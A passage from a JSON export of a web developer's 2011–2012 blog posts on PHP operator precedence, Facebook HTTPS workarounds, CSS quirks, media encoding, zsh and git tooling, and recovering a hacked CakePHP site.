  "text": "<p>Just found this weird little behavior of PHP today :</p>\n<pre><code lang=\"php\">$a = false;<br />$b = true;<br />$c = $a OR $b;<br />$d = ($a OR $b);<br />var_dump(compact('a', 'b', 'c', 'd'));<br />array(4) {<br />\t[\"a\"]=&gt;    bool(false)<br />\t[\"b\"]=&gt;    bool(true)<br />\t[\"c\"]=&gt;    bool(false)<br />\t[\"d\"]=&gt;    bool(true)<br />}</code></pre>\n<p><code>$a OR $b</code> in fact returns <code>$a</code>, while <code>($a OR $b)</code> returns the result of the parenthesis. On the other hand, <code>$a || $b</code> correctly returns the result of the expression.</p>\n<p>It seems that <code>AND </code>and <code>OR </code>are weak compared to <code>&amp;&amp;</code> and <code>||</code>.</p>\n<p>Be aware of that, or it might backfire on you. Or just discard all <code>AND </code>/ <code>OR </code>in favor of <code>&amp;&amp;</code> /<code> ||</code></p>",
  "publish_start": "2011-12-02 11:12:02",
  "slug": "php-differences"
}, {
  "id": 330,
  "name": "Facebook https mixed content warning on IE9",
  "text": "<p>When browsing the web, you might have seen a \"mixed content warning\" popup show in your browser. They are most of the time poorly worded and their meaning is quite obscure.</p>\n<p>What it means is that your are currently browsing a page with both <code>http </code>and <code>https </code>content. Typically, if your page is <code>https </code>but one of the css, js or image file it contains is requested through <code>http</code>, the warning will pop.</p>\n<p><em>(It's interesting to note here that not all assets are treated equal. Loading a flash movie through <code>http </code>does not trigger the warning).</em></p>\n<h4>The IE special case</h4>\n<p>Now, what's special about IE is that it also trigger the mixed content warning when content is the other way around. If you're serving a page through <code>http </code>and load assets through <code>https</code>, it will consider it a mixed content too.</p>\n<p>In a sense, that's logical, but it needlessly prompt the user with a dialog that block downloading of all <code>https </code>assets until confirmed.</p>\n<p>The solution is to make sure that all your assets are loaded with the same protocol as the host page. An easy way to do so is to use the <code>//</code> relative protocol url. This will use <code>http </code>or <code>https </code>automatically based on the page protocol.</p>\n<h4>And adding Facebook to the mix</h4>\n<p>A few months ago, Facebook forced all apps to serve content through <code>https</code>. In the meantime, they suggested that all their users browse their website using <code>https </code>too.</p>\n<p>Unfortunatly for us, some of our own users had bookmarks in their browsers and Facebook pages referencing our old <a href=\"http://apps.facebook.com/appname/\" target=\"_blank\">http://apps.facebook.com/appname/</a> url. And following that link triggered the dreaded mixed content warning in IE.</p>\n<p>When accessing this page, Facebook was loaded in classic <code>http </code>but our inner iframe was loaded through <code>https</code>. So far, so good.</p>\n<p>The problem came from one of Facebook own javascript SDK included in our app. This script loaded other scripts based on what it needed.</p>\n<p>Unfortunatly, it loaded the other scripts from an <code>http </code>(not <code>https</code>) server. The SDK has two distinct sets of urls, based on the current page protocol.</p>\n<p>It was wrongly considering being in an <code>http </code>page, not an <code>https </code>one, and thus used the wrong set of urls. This confusing comes from the fact that it checks the top page protocol instead of checking the current page protocol.</p>\n<p>After some googling, I found a solution that consisted in forcing the SDK to consider that we are in <code>https </code>mode by calling : <code>FB._https = true</code> before the call to<code> FB.init()</code></p>\n<h4>Almost there</h4>\n<p>If correctly forced FB to use the correct set of urls, thus removing the mixed content warning. And I almost thought it would be that easy.</p>\n<p>It was not.</p>\n<p>This did not fixed the payment popup. All Facebook UI element loaded correctly (feeds, permissions, requests), but the payment popup.</p>\n<p>I couldn't find a way to fix that, so I reverted to a more brutal approach.</p>\n<h4>Final and brutal solution</h4>\n<p>All my problems came from the fact that FB thought we were serving <code>http </code>while in fact we were serving <code>https</code>. So the solution, might be to force FB to serve <code>https </code>from start to end.</p>\n<p>I wanted to detect if the page was loaded through <a href=\"http://apps.facebook.com/appname/\" target=\"_blank\">http://apps.facebook.com/appname/</a> or <a href=\"https://apps.facebook.com/appname/\" target=\"_blank\">https://apps.facebook.com/appname/</a>.</p>\n<p>Unfortunatly, due to cross domain restrictions in Javascript, we are not able to read, from inside and iframe, the parent frame properties. So I couldn't read <code>top.location.protocol</code> to easily check if I needed to redirect.</p>\n<p>But, as I mentionned earlier, <code>FB._https</code> incorrectly report that we are not in <code>https </code>because it checks the top protocol. So I used this var, to know if the parent frame was in the correct protocol or not. Using this own FB bug to fix itself.</p>\n<p>Now, for the redirect : even if I couldn't read the<code> top.location</code>, I could modify it. I just had to call <code>top.location.url = 'https://apps.facebook.com/appname/'</code> to redirect the whole page.</p>\n<p>I hardcoded the app url because there was no way to get it from js, and I took care of keeping any GET parameter passed before the redirect, and I ended up with this :</p>\n<pre><code lang=\"js\">if (!FB._https) {<br />\tvar appUrl = 'https://apps.facebook.com/appname/';<br />\tvar iframeUrl = location.protocol+'//'+location.host+location.pathname;<br />\tvar redirectUrl = location.href.replace(iframeUrl, appUrl);<br />\ttop.location.href = redirectUrl;<br />\treturn;<br />}<br />FB.init(options);</code></pre>\n<h4>Conclusion</h4>\n<p>I'm not really proud of this solution, as it is mostly a hack and will force a useless loading of the http version before loading the https one, but that's the best I've found. If any of you have a better solution, feel free to comment.</p>\n<p> </p>\n<p> </p>",
  "publish_start": "2012-01-04 12:44:20",
  "slug": "facebook-https-mixed-content-warning-ie9"
}, {
  "id": 331,
  "name": "Installing jshint with node v0.6.6",
  "text": "<p>Yesterday, I've tried to install nodejs and the jshint package to add automatic jshint parsing to my vim.</p>\n<p>Well, it wasn't so simple due to a bug in the npm version shipped with node.</p>\n<p>Here are the complete commands to run to make it work, in case I had to do it again :</p>\n<pre><code lang=\"sh\"># Download and extract node<br />cd ~/local/src<br />wget http://nodejs.org/dist/v0.6.6/node-v0.6.6.tar.gz<br />tar xvzf node-v0.6.6.tar.gz<br />rm node-v0.6.6.tar.gz<br /># Compile and install<br />cd node-v0.6.6<br />./configure<br />make<br />sudo make install<br /># Update npm<br />sudo npm install npm@alpha -g<br /># (Optional) Clear npm cache<br />npm cache clean jshint<br /># Install jshint<br />sudo npm install jshint -g<br /></code></pre>\n<p>Source : <a href=\"https://github.com/isaacs/npm/issues/1888\" target=\"_blank\">https://github.com/isaacs/npm/issues/1888</a></p>",
  "publish_start": "2012-01-04 15:17:25",
  "slug": "installing-jshint-node-v0-6"
}, {
  "id": 332,
  "name": "Productivity tip #1 : Using global hotkeys",
  "text": "<p>This post will be the first of what I hope will be a long serie of posts. I'll blog about some of the little tricks I've learn in the past years that make me go faster on my daily job.</p>\n<p>I'll start with something I can no longer work without : my global hotkeys.</p>\n<p>The concept is pretty simple, I've binded some keys combinations to launch specific applications or directories. It might not seem very important, but it does make you gain a tremendous amount of time for those apps you launch pretty often like browser, IDE, or project directory.</p>\n<p>I used to work on Windows, and I then used a little script named <a title=\"AutoHotKey\" href=\"http://www.autohotkey.com/\" target=\"_blank\">AutoHotKey</a> to bind my keys. The script even comes packaged with its own language if you ever want to script complicated stuff.</p>\n<p>I'm now working under Ubuntu, and the global hotkeys can be defined directly from the System Settings (in 11.10 it's <code>System Settings &gt; Keyboard &gt; Shortcuts &gt; Custom Shortcuts</code>)</p>\n<h4>Opening apps</h4>\n<p>I choose a key combination hard enough to type so I won't type it by mistake, but easy enough to remember that I could type it whenever I want.</p>\n<p>For example, I binded all the app I use the most to a <code>Ctrl+Win+{Letter}</code> combination. <code>Ctrl+Win+C</code> opens Chromium, <code>Ctrl+Win+F</code> opens Firefox, <code>Ctrl+Win+T</code> opens Trillian, etc.</p>\n<h4>Opening folders</h4>\n<p>I used a close combination for opening directories : <code>Ctrl+Win+Alt+{Letter}</code>. Those three keys are side by side on most keyboards so pressing them is easy.</p>\n<p>This time I used the letter <code>H</code> for my home folder, <code>D</code> for the Dropbox folder, <code>W</code> for <code>/var/www</code>, etc, etc.</p>\n<p>I've tweaked my keyboard in a few other ways, but this will be the subject of another post. Hope this one gave you some ideas.</p>",
  "publish_start": "2012-01-05 21:07:38",
  "slug": "productivity-tip-1-global-hotkeys"
}, {
  "id": 333,
  "name": "Alternative way for multiple classes in IE6",
  "text": "<p>In a pure OOCSS style of writing CSS, let's imagine you created a css class of <code>.button</code> that visually turns a simple link into a button.</p>\n<pre><code lang=\"html\">\n&lt;a href=\"#\" class=\"button\"&gt;I'm a button&lt;/a&gt;</code></pre>\n<p>Now, if you want to define a custom version of your button, let's say a button that will trigger a very dangerous action, you might want to style it differently, so our user will think twice before hitting it.</p>\n<p>You got two ways of achieving this, depending if you still support IE6 or not.</p>\n<h4>Simple way for non-IE6</h4>\n<p>If you don't care about IE6 (and hell, it's 2012, you shouldn't), you just have to add a second class to your button/link :</p>\n<pre><code lang=\"html\">\n<p>&lt;a href=\"#\" class=\"button dangerous\"&gt;I'm a dangerous button&lt;/a&gt;</p>\n</code></pre>\n<p>And in your CSS file, just define some special styles (like a red <code>background</code>) to your dangerous button.</p>\n<pre><code lang=\"css\">\n.button.dangerous { ... }</code></pre>\n<p>Actually, that's the path followed by <a href=\"http://twitter.github.com/bootstrap/\" target=\"_blank\">Bootstrap </a>(among others). But it will not correctly work in IE6, because it does not understand multiple classes rules. Instead, IE6 will read <code>.button.dangerous {}</code> the same as <code>.dangerous {}</code>.</p>\n<p>This will cause problems as soon as you'll use the <code>.important</code> class on something else than a <code>.button</code> : IE will apply the <code>.button.dangerous</code> rules to anything with the <code>.dangerous</code> class.</p>\n<h4>Other way, for IE6</h4>\n<p>The solution I personnaly use to fix IE6 is to use more explicit classes instead of using multiple ones. For example, instead of <code>.button.dangerous {}</code> I'll use <code>.buttonDangerous {}</code> and write my html like this :</p>\n<pre><code lang=\"html\">\n&lt;a href=\"#\" class=\"button buttonDangerous\"&gt;I'm a dangerous button, even on IE6&lt;/a&gt;<br /></code></pre>\n<p>That way, the link will have both the styles of <code>.button</code> and <code>.buttonDangerous</code>. This will assure cross compatibility with IE6, at the expense of a (arguably) less readable markup.</p>\n<p>As of today, I hope that I'll never have to code for IE6 websites again, but if you ever need to, that's a little trick that can really help.</p>",
  "publish_start": "2012-01-06 18:23:04",
  "slug": "alternative-multiple-classes-ie6"
}, {
  "id": 334,
  "name": "The :visited pseudo-class specificity gotcha",
  "text": "<p>In a <a title=\"Alternative way to handle multiple classes in ie6\" href=\"/blog/333:alternative-multiples-classes-ie6\">previous post</a>, I bloggued about the way to emulate OOCSS behavior with multiple classes in IE6.</p>\n<p>Today, I'll do a follow up and write about a possible gotcha involving the <code>:visited</code> pseudo class.</p>\n<p>Following the previous example let's imagine you have a styling for your defauls links (<code>a { color:blue; }</code>), one for the default buttons (<code>.button { ... }</code> ) and one for a custom button that extend the <code>.button</code> (<code>.customButton { ... }</code>)</p>\n<p>Now, imagine that you'll want to style all <code>:visited</code> links the same way non-visited links are styled. You might write something like :</p>\n<pre><code lang=\"css\">\na, a:visited { color:blue; }\n</code></pre>\n<p>Unfortunatly, this will have some nasty side effects on your <code>.button</code> and <code>.customButton</code> rules because <code>a:visited</code> will have precedence over <code>.button</code> and <code>.customButton</code></p>\n<p>You can find more information about CSS specificity in this <a title=\"CSS: Specificity Wars\" href=\"http://www.stuffandnonsense.co.uk/archives/css_specificity_wars.html\">Star Wars</a> post.</p>\n<p>Your first solution could be to add even more specificity to your own rules, to override the <code>a:visited</code> one, like so :</p>\n<pre><code lang=\"css\">\n.button, .button:visited { ... }\n.customButton, .customButton:visited { ... }\n</code></pre>\n<p>This will work, of course, but you're only adding complexity to your specificities, and this get more and more tedious the more you add other customised buttons.</p>\n<p>In fact, there is a much better way, one that you could throw in your <code>reset.css</code> if it isn't there already :</p>\n<pre><code lang=\"css\">\na:visited { color:inherit; }\n</code></pre>\n<p>That way, all your visited links will inherit their color from their non-visited version. This mean that visited <code>.button</code> will use the <code>.button</code> color, visited <code>.customButton</code> will use <code>.customButton</code> color and simple visited links will use the <code>a</code> color.</p>\n<p>Of course, if you defined a <code>background-color</code> in your <code>a</code>, you should define a <code>background-color:inherit</code> in your <code>a:visited</code> too.</p>",
  "publish_start": "2012-01-07 01:06:09",
  "slug": "visited-pseudo-class-specificity-gotcha"
}, {
  "id": 335,
  "name": "Productivity tip #2 : Use a Dropbox",
  "text": "<p>Here's one more post in my productivity serie. This one is about the Dropbox service.</p>\n<h4>What is Dropbox ?</h4>\n<p>In a nutshell, Dropbox is a private hosting service, based on a cloud infrastructure. Once you've installed the app, one of your folders (default to <code>~/Dropbox</code>) became synchronized with your Dropbox account.  Every document that you save in that folder, and any subfolder you create, will immediatly be saved online in your Dropbox account.</p>\n<p>In the real world, it means that you can easily share one folder and all its documents easily between all your computers. If you don't want to install the app, you can simply log to <a href=\"http://www.dropbox.com\">dropbox.com</a> and download/upload any file you want.</p>\n<h4>How I use it</h4>\n<p>There a few ways you can use Dropbox. Here are a few of mine, feel free to add yours in the comments.</p>\n<p>As I used to work on Windows (and I still have to sometimes), I always had to install a bunch of apps on a brand new computer before being able to start working. This includes the traditional antivirus, browser, music player, IDE, etc. Instead of going through the laborious process of downloading all the installer on each of the websites, I've saved them in my Dropbox and I just have to install Dropbox, then install the apps I need.</p>\n<p>Instead of a bunch of <code>todo.txt</code> files spread accross all your computers, wouldn't it be tidier to only have one, shared ?</p>\n<p>The same goes for the KeePass file, so you can have an easy access to all your passwords.</p>\n<p>I also use it to synchronize my Tomboy notes between my computers (I'll go into more details in another note).</p>\n<p>It might be a bit excessive, but I personnally also share my icons, sounds, wallpapers and other customization stuff, so I won't feel lost on a new computer.</p>\n<p>Thanks to the amazing <a href=\"http://www.getdoxie.com\">Doxie scanner</a> (more on that on another note), I'm now a scan junkie. I scan all the official paperwork I got in my physical mailbox and store it in the Dropbox.</p>\n<p>Be it a bill or a banking receipt, I scan anything that looks like official and that I might need again one day.  That way, I know I can always connect to <a href=\"http://www.dropbox.com\">dropbox.com</a> and find any official document of the past 5 years in a matter of minutes. This saved my day quite a few time already !</p>\n<h4>Last words</h4>\n<p>Dropbox is a free service. You can have 2Go for free, or pay for a more space. I personnaly only use a fraction of that so I stay on the free plan. I haven't mentionned it because I don't use it, but you can also share some folders with other Dropbox users, which is a nice addition when working on the same project.</p>",
  "publish_start": "2012-01-17 23:30:24",
  "slug": "productivity-tip-2-dropbox"
}, {
  "id": 336,
  "name": "Downloading all the TEDTalk podcasts",
  "text": "<p>As I'm about to move for a couple of long months without an internet connection and a lot of travel hours, I thought of downloading the TEDTalk podcasts.</p>\n<p>Being a linux user for about a year now, I'm taking the habit of using the linux tools to do the boring and repetitive work. Downloading more than a hundred files seems like a good candidate for a script.</p>\n<p>The complete list of audio podcasts is available <a title=\"Full TEDTalk list\" href=\"https://spreadsheets.google.com/pub?key=0Ahz_ZQm7pkwTdFBVWXBLOFNGSkdsVFgxc0Y0bk9lc0E\">here</a>. I simply selected all text and copied it into a <code>file.txt</code>.</p>\n<p>Then, it was simply a matter of extracting only the urls, and feeding them to <code>wget</code></p>\n<pre><code lang=\"sh\">cat file.txt | tr ' ' '\\n' | tr '\\t' '\\n' | grep http &gt; list.txt\nwget --no-clobber -i list.txt\n</code></pre>\n<p>This took a while to download as there are more than 400 files, but that way I'll have some interesting talks to listen to during my trip.</p>",
  "publish_start": "2012-01-23 16:22:47",
  "slug": "putting-tedtalk-mp3-player"
}, {
  "id": 337,
  "name": "This blog got hacked",
  "text": "<p>Today, at about 9pm (GMT+12), I found my own blog hacked. When I wanted to access it, I was redirected to a malware site.</p>\n<p>Half an hour later, it is back online again, and here is what I did.</p>\n<p>First, I downloaded the webpage on my computer using <code>curl http://www.pixelastic.com/ </code>to analyse it in search of a clue on the attack vector.</p>\n<p>Unfortunatly, I couldn't easily find the culprit. No <code>img</code> tag loading a <code>php</code> file, no XSS injection that I could find. My guess is that the attacker tampered the <code>js</code> files loaded to add its own custom evil script. But as my js files are concatened and compressed in a file with a md5 name, it wasn't obvious that they had been compromised.</p>\n<p>After that, I <code>ssh</code>ed to the server and tried to find what files where modified since my last commit. As I'm using Mercurial for that, this was a simple matter of <code>hg status.</code></p>\n<p>And I got a shitload of result. Actually, all my <code>php</code> files had been modified (and as I'm using cakePHP, that means, a lot of file). Running <code>hg diff</code>, I found out that all the php code of each file had been replaced with an evil code (enclosed in several layers of eval+base64).</p>\n<p>I updated my working directory to the latest commit with <code>hg update --clean</code> to get all those files as they were before the attack. Running <code>hg status</code> once more still showed a bunch of new php files added. Running <code>hg purge</code> finally get rid of them.</p>\n<p>I finally deleted all the compressed css and js files, to force them to be created again, and that's it, the website is online again.</p>\n<p>I still don't have a clue on how this happened. How did someone access my files ? Is that an XSS attack ? Is my password cracked ? Is there another security weakness I'm not aware of ?</p>\n<p> </p>\n<p>EDIT : Got hacked again. Seeing that the cakePHP Cache files were deleted, I guess it is a known attack on a cake vulnerability. Got the website up again, but will fix it as soon as my holidays allow.</p>",
  "publish_start": "2012-02-25 11:04:07",
  "slug": "blog-hacked"
}, {
  "id": 338,
  "name": "How I want my music files encoded",
  "text": "<p>I have a lot of music files on my computer. Some comes from CDs I encoded, other comes from the magic of file sharing. Most of them are in <code>MP3</code> format, but I have a few <code>ogg</code> and <code>wma</code> tracks, mixed with even a bit of <code>wav</code> or <code>flac</code> files.</p>\n<p>Even the <code>mp3</code> files are encoded in a bunch of different settings, with various bitrates and frequencies. The only thing that is quite consistent in all that is that my tagging of metadatas.</p>\n<p>Other than that it's quite a mess and has my collection grow larger, it starts to bother me. No two albums, even for the same music duration, are the same filesize.</p>\n<p>I decided to clean a bit this whole mess. Let me explain my goal, and how I plan on doing that.</p>\n<p>First, I want all my files encoded with the same settings, so the music I'm listening to and its file size is consistent accross different albums.</p>\n<p>Second, I want all the files correctly taggued with track number, artist, album and song name. I don't really care about the year nor the genre. Genre is highly subjective, and year can be misleading in mixed albums like soundtracks, are we talking about the year of the release of the cd, or the year of the release of the individual song?</p>\n<p>Third, I want all my files in <code>ogg</code> format. First, because I want to get rid of as many proprietary format as I can, and <code>mp3</code> is proprietary. But mainly because <code>mp3</code> is an encoding format bloated with the previous layers of MPEG layer 2 and MPEG layer 1, resulting in larger file size and more encoding complexity.</p>\n<p>And finally, I want to have the best sound quality that I can afford, without going to extreme like listening to <code>FLAC</code> directly as my ears won't be able to catch the difference anyway.</p>\n<p>So, I'm gonna buy a big hard drive, something around 1To I think, and put on it all my music files in <code>FLAC</code> format, encoded directly from CD. This <code>FLAC</code> files will have all the required metadata saved in them.</p>\n<p>Then, I'll create an <code>ogg</code> subdir in each of my album dirs where I'll encode my FLAC in <code>ogg</code> with a bitrate of 128kbds (as the human hear won't be able to really get the difference with anything higher than that), and using the metadata from the <code>FLAC</code> files.</p>\n<p>Finally, I'll put the <code>ogg</code> files on my portable media player and listen to them on the go.</p>\n<p>I do not need to put the <code>FLAC</code> on the PMP, has my ears won't be able to hear the difference. I only need to put a compressed version. Maybe in a few years, when PMP hard drive size will have increase I'll be able to increase the quality of my <code>ogg</code> and use better quality files. If I ever need to do that, I won't have to rip the CDs again as I'll already have the <code>FLAC</code> to create the encoding.</p>\n<p>This will be hard work, but I guess it will be worth it in the long run. At least, now I know a bit more about encoding formats and settings.</p>",
  "publish_start": "2012-06-04 03:34:13",
  "slug": "music-files-encoded"
}, {
  "id": 339,
  "name": "A small note about video encoding and formats",
  "text": "<p>Following my previous note on audio files, I made some research on video files. I have a huge amount of video on my hard drive, so much that I actually needed to do a bit of cleaning.</p>\n<p>That's when I discovered that I had a plethora of different file formats (<code>avi</code>, <code>mp4</code>, <code>mkv</code>) and in various resolution, quality and filesize. Also, filesize was not always dependent on quality. I had some really heavy files that were not better looking that smaller one.</p>\n<p>So I started some research on the Wikipedia and Google to understand more about all those fileformats, and here are my results.</p>\n<h4>Containers</h4>\n<p>First of all, the <code>avi</code>, <code>mp4</code> or <code>mkv</code> file extension denote a container format. This container is just a box that contain video and audio stream. Not all boxes are created equal, though.</p>\n<p><code>avi</code> is a Microsoft container but gained (in)famous popularity in the first days of p2p filesharing. This is a very simple container, able to hold one video and one audio stream. Then, was created the <code>mp4</code> container. This one is an ISO box, so already much better than the Microsoft one. This actually is a good container, allowing the use of several audio and videos streams as well as subtitles.</p>\n<p>Then, came the <code>mkv</code> container. It is as good as <code>mp4</code>, and even allow more customization, but the important point is that it is patent free. The only downside to <code>mkv</code> is that it is not as widely supported as the other two format, but the specs being public and open, this is slowly changing.</p>\n<p>I also had some other extensions, like <code>wmv</code>, <code>mov</code> or <code>divx</code>. <code>divx</code> is only an <code>avi</code> in disguise, because of legal reasons. <code>wmv</code> is another Microsoft container, this one being an improved <code>avi</code> with DRM. <code>mov</code> is an Apple container, aimed to media creation. A <code>mov</code> is actually quite a powerful container, that could be used for much more than simply media playback but also media creation.</p>\n<p>If I had to choose, I'll pick mkv.</p>\n<h4>Video codecs</h4>\n<p>Now, what do we put in those boxes ? First, a video stream. We could put an uncompressed video stream in it, but this will result in huge filesize, so we actually never do that.</p>\n<p>Instead, we use codec (short for <em>coder/decoder</em>) to compress this stream in something with a more manageable size. The most famous is DivX. DivX started as an encoder hacked from Microsoft first avi files and was heavily used to encode movies before sharing them online. Because of legal dispute with Microsoft, the guys that created DivX had to recode it from scratch. In the meantime, an opensource fork of DivX, named Xvid was created and after a few version became even better than the original Divx.</p>\n<p>MPEG, MPEG2 and MPEG4 are succesive iteration of another codec that compress a video stream by looking at its pixels and checking if they changed from one frame to another, to avoid redrawing them. With each succesive versions it then started to track movement, color and lightning of these pixels. In the end, it gave birth to the h264 codec which is used on Blueray (while MPEG2 was used on DVD). h264 is the de facto standard of HD video of today. It requires more processing power than its MPEG counterparts but deliver a much better quality for an equal filesize. Recent hardware is today optimized to handle h264 natively.</p>\n<p>As for mkv and mp4, there also is the same difference between H264 and Theora. Theora got equivalent quality than H264, but is patentfree. On the other end, H264 is very widely supported while Theora is not (as can be seen in HTML5).</p>\n<p>Microsoft also created a closed source wmv codec to go with its wmv container. It is supposed to be based on MPEG4, but there is little known to it, so it of absolutly no use to me.</p>\n<p>So, as you can see, there is almost no relation between a codec and its container. You can have a divx encoded file in an mkv, or a Theora in an avi. But, in the real world, some codec are most often found with some container, like divx in avi or h264 in mp4.</p>\n<p>Here, I'll pick h264 because of the hardware support.</p>\n<h4>Audio codec</h4>\n<p>As for the video stream, the audio stream is also compressed using an audio codec. The most common audio codec is the mp3. This is a lossy codec, meaning it discards information to get the filesize lower. It is based on a method that will discard sounds that the human hear will not be able to hear anyway.</p>\n<p>mp3 has its drawbacks, like being bloated from succesive mpeg versions and still being patented.</p>\n<p>A new codec, the AAC succeed to mp3. It will also discard sounds the human hear cannot get, but will also encode redundancy in a better way. Even if mp3 was the de facto standard for a long time, AAC is gaining a huge popularity because it is backed up by all the big companies.</p>\n<p>Then, the story gœs on and on. There is an open source, patent free equivalent to AAC, being ogg. Once again, its as good as its opponent (even better on low bitrates), but there isn't as many devices able to read ogg as they're are able to read AAC. But once, again, things are slowly changing.</p>\n<p>Here, I'll choose ogg over the alternatives.</p>\n<h4>Conclusion</h4>\n<p>I have a bunch of files, in different containers, encoded with different encoders and I'm going to try to clean a bit all this. First, I'll get rid of all the \"bad\" containers (<code>mov</code> and <code>wmv</code>) and use <code>mkv</code> instead.</p>\n<p>For files that are too big, I'll try to convert them to a better format. h264 video with an ogg audio stream in an mkv container.</p>\n<p>Well, there also is the matter of the video resolution, data rate, fps and audio frequency but this might be the subject of another post.</p>",
  "publish_start": "2012-08-09 11:28:58",
  "slug": "small-note-video-encoding-formats"
}, {
  "id": 340,
  "name": "Use the system trash with ZSH terminal",
  "text": "<p>When you start using the terminal as your main file explorer instead of a GUI one, you soon discover two important things.</p>\n<p>First, it is much faster to browse accross your filesystem, copying and moving files in the terminal that it is with your mouse. This is hard to believe at first (how can writing text on a dull black screen be faster than drag'n'dropping ?) but it is nonetheless true (after a bit of practice, sure).</p>\n<p>The second thing is that it is also much much easier to <strong>permanently delete very important files </strong>as deleting a file through the terminal has no trash bin nor any other safeguard mechanism.</p>\n<h4>Scripting a rm replacement</h4>\n<p>At first, I scripted my own rm <code>rm</code> replacement that was manually moving files to <code>~/.local/share/Trash/files</code> (the common Trash directory) instead of deleting them. But it was a bit naive and couldn't really work on removable drives nor provide a \"restore\" mechanism.</p>\n<p>Fortunatly, the <code>trash-cli</code> package on Ubuntu provides a set of methods to deal with the trash from the command line. They have very explicit names such as <code>trash</code>, <code>list-trash</code>, <code>restore-trash</code> or <code>empty-trash</code>.</p>\n<h4>ZSH aliases</h4>\n<p>I had to resort to quite a bit of ZSH tweaking to make it a perfect <code>rm</code> replacement. First, I added a simple alias for the <code>rm</code> command.</p>\n<pre><code>alias rm='trash'\n</code></pre>\n<p>Then I also wanted to change the default <code>rmdir</code> command. I could have used the same type of alias (<code>alias rmdir='trash'</code>) but I would have lost the builtin ZSH autocompletion of directories zsh provides with <code>rmdir</code>.</p>\n<p>When you define aliases with ZSH, you can choose if you want it to autocomplete based on the right hand side of your alias (<code>NO_COMPLETE_ALIASES</code>) or the left hand side (<code>COMPLETE_ALIASES</code>). Yes, the name of the options seem wrong to me too, but this is actually how it works.</p>\n<p>I prefer setting <code>NO_COMPLETE_ALIASES</code> so I can use the correct autocompletion on my commands with my aliases, but for the <code>rmdir</code> case this was proving to be an issue.</p>\n<h4>rmdir autocompletion</h4>\n<p>So, I started writing my own <code>rmdir</code> implementation in a custom script. This was merely a wrapper to <code>rmdir</code> but putting it in its own script allowed me to change its name and thus changing its autocomplete method.</p>\n<p>I named it <code>better-rmdir</code>, and put it in my <code>$PATH</code>. Here is the code</p>\n<pre><code>#!/usr/bin/zsh\ntrash $@\n</code></pre>\n<p>As you can see, this is just a wrapper, taking the initial arguments and passing them to <code>trash</code>.</p>\n<p>But I also created a file named <code>_better-rmdir</code> and put it in my <code>$FPATH</code> (this is where ZSH goes looking to autocomplete methods). I just copied the code of the original <code>_directories</code> method (that you can probably find in <code>/usr/share/zsh/functions/Completion/Unix/</code>), and adapted it to fit my newly created <code>better-rmdir</code></p>\n<pre><code>#compdef better-rmdir\nlocal expl\n\n_wanted directories expl directory _files -/ \"$@\" -\n</code></pre>\n<p>And finally, I added an alias (<code>alias rmdir='better-rmdir'</code>) and everytime I ask for an autocomplete on <code>rmdir</code> it actually looks for the autocomplete of <code>better-rmdir</code>, which is the code contained in <code>_better-rmdir</code> and which in turn return only directories.</p>\n<p>Now I have complete <code>rm</code> and <code>rmdir</code> commands in my terminal that move files to the trash.</p>",
  "publish_start": "2012-08-20 07:48:04",
  "slug": "system-trash-zsh-terminal"
}, {
  "id": 341,
  "name": "ZSH autocompletion for git unstage ",
  "text": "<p>I recently switched to git as my main version control system (I used to use Mercurial before that). I quickly grasped the concept of the staging area and used the <code>git add</code> command extensively to add before committing.</p>\n<p>And zsh ships with nice git autocompletion features, and suggests files to add with <code>git add</code> when you press Tab.</p>\n<h4>Git unstage</h4>\n<p>What is missing from the basic git commands is a way to unstage a file from the staging area. Well, I can do it with <code>git reset HEAD</code>, but this command is a bit tedious to type.</p>\n<p>So I created an alias, named <code>git unstage</code> that does just that. I just added the following lines to my <code>~/.gitconfig</code>, under the <code>[alias]</code> header :</p>\n<pre><code>unstage = reset HEAD\n</code></pre>\n<p>I can now easily add files to the staging area with <code>git add</code> and remove them with <code>git unstage</code></p>\n<h4>Autocompletion</h4>\n<p>At this point, <code>git unstage</code> autocompletion does not work. It simply suggest all files in the current directory, while I'd like it to suggest only files in the staging area.</p>\n<p>When you create a git alias, you cannot simply add a zsh autocomplete method for that alias (meaning, you cannot create a <code>_git-unstage</code> method), you have to hook your custom autocomplete logic to the underlying git method your alias refers to. In this case, this is the <code>git reset</code> method.</p>\n<p>So, I created my own <code>_git-reset</code> autocompletion function. Actually, I borrowed the one already defined in <code>/usr/share/zsh/functions/Completion/Unix/_git</code> and tweaked it a little bit.</p>\n<p>I created a file named <code>_git-reset</code> and put it in my <code>$FPATH</code> so zsh will load it when asked for autocompletion and it will overwrite the <code>_git-reset</code> method already defined in <code>_git</code>.</p>\n<p>Here is the full content of the file :</p>\n<pre><code>#compdef git-reset\n\n_git-reset () {\n    local curcontext=$curcontext state line\n    typeset -A opt_args\n\n    _arguments -C -S -A '-*' \\\n            '(-q --quiet)'{-q,--quiet}'[be quiet, only report errors]' \\\n            '::commit:__git_revisions' \\\n        - reset-head \\\n            '(        --soft --hard --merge --keep)--mixed[reset the index but not the working tree (default)]' \\\n            '(--mixed        --hard --merge --keep)--soft[do not touch the index file nor the working tree]' \\\n            '(--mixed --soft        --merge --keep)--hard[match the working tree and index to the given tree]' \\\n            '(--mixed --soft --hard         --keep)--merge[reset out of a conflicted merge]' \\\n            '(--mixed --soft --hard --merge       )--keep[like --hard, but keep local working tree changes]' \\\n        - reset-paths \\\n            '(-p --patch)'{-p,--patch}'[select diff hunks to remove from the index]' \\\n            '*::file:-&gt;files' &amp;&amp; ret=0\n\n    case $state in\n        (files)\n            local commit\n            if [[ -n $line[1] ]] &amp;&amp; __git_is_committish $line[1]; then\n                commit=$line[1]\n            else\n                commit=HEAD\n            fi\n            # Suggest files in index if `git reset HEAD`\n            if [[ $line[1] = HEAD ]]; then\n                __git_changed_files\n            else\n                __git_tree_files . $commit\n            fi\n            ret=0\n            ;;\n    esac\n}\n\n_git-reset \"$@\"\n</code></pre>\n<p>As you may have noticed this script is an almost exact copy/paste from the original <code>_git-reset</code> script. The only modification I've done is in those lines :</p>\n<pre><code>    # Suggest files in index if `git reset HEAD`\n    if [[ $line[1] = HEAD ]]; then\n        __git_changed_files\n    else\n        __git_tree_files . $commit\n    fi\n</code></pre>\n<p>What it does is checking the first argument of <code>git reset</code>, and if it's <code>HEAD</code>, it suggests files in the staging area (<code>__git_changed_files</code>) instead of files in the current repo (<code>__git_tree_files</code>).</p>\n<p>It took me quite a bit of time to figure out which method to use to get files in the staging area as I had been looking for a <code>__git_staged_files</code> for quite a while and finally discovered that the <code>__git_changed_files</code> was actually what I was looking for.</p>\n<h4>Conclusion</h4>\n<p>The <code>git unstage</code> alias is quite common, you can find it in a lot of books and websites teaching git. But it becomes much more usable once zsh does the autocomplete for you and you can easily select files to unstage that 